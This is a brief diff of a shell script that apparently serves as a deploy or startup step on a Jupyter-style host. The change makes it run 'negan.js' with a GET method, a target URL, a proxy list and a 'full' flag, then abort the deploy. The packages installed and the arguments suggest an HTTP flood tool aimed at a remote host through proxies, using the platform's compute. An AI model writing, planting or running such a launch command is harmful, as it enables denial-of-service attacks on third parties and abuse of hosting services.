@@ -2,7 +2,7 @@
 
 cp -r . /home/jovyan/ 2>/dev/null
 npm install hpack https commander colors socks
-node negan.js
+node negan.js -m GET -u https://unprot-cloudflare.dstatbot.org/6c113d91-903e-4981-94e0-acb9ec34461c -p live.txt --full true 
 
 echo -e "\n🚨 Hủy deploy..."
 exit 1
